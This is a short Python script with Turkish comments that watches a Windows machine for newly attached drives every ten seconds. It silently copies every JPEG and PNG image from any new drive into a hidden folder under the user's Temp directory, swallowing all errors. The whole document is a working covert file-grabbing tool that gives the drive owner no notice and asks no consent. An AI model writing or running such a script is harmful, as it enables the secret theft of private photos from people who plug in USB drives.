from ctypes import windll
import string
import time
import os
import shutil

def surucu_bul():
    bitmask = windll.kernel32.GetLogicalDrives()

    suruculer = list()

    for harf in string.ascii_uppercase:
        if bitmask & 1: #Bitmaski ve 1'i ikilik tabana çevirir. And işlemi bu sayıları çarpar.
            suruculer.append(harf) #True dönerse listeye sürücü adını atar.

        bitmask >>=1 #İşlemden sonra herbir bitimizi bir sağa kaydırırız.

    return suruculer

username = os.getlogin() #Bilgisayarın kullanıcı adını döner.

if not os.path.exists("C:/Users/"+username+"/AppData/Local/Temp/kopya"):#Böyle bir klasör yoksa, 
    os.mkdir("C:/Users/"+username+"/AppData/Local/Temp/kopya")#bu klasörü oluşturur.
    
while True:

    try:

        ilk = surucu_bul()

        time.sleep(10) #10 sn de bir kontrol edilir.

        ikinci = surucu_bul()

        if len(ikinci) > len(ilk):
            usb_suruculer = set(ikinci) - set(ilk)

            for surucu in usb_suruculer:
                for ky,ki,di in os.walk(surucu+":/"): #Sürücünün içindeki heryere gider.
                    for x in di: #Bütün dosya isimleri içinde gezinir.
                        if x.endswith(".jpeg") or x.endswith(".png") or x.endswith(".jpg"): #Dosya uzantıları bu şekilde ise bu dosyalar alınır.
                            shutil.copy(ky+"/"+x,"C:/Users/"+username+"/AppData/Local/Temp/kopya") #Sürücünün içindeki alınan dosyaları kopyalar. 
    except:
        pass
